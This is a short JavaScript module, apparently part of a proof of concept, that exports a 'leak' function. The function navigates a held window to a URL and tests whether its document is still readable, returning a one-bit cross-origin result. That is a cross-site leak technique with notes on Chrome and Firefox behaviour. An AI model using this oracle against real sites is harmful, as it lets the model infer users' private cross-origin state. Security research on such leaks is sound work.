const leak = async (url) => {
    return new Promise(async(r) => {
        window.WW.location = url
        // could be done differently
        await sleep(2000)
        try {
            // chrome returns undefined, Firefox not
            if(window.WW.document || window.WW.document === undefined){
                // window is ded now :/ 
                return r(0)
            }
            else{
                console.debug(window.WW.document)
                return r(1)
            }
        }
        catch(e){
            return r(1)
        }
        
       
    })
}

const sleep = (ms) => {
    return new Promise(r => setTimeout(r, ms));
}


export { leak }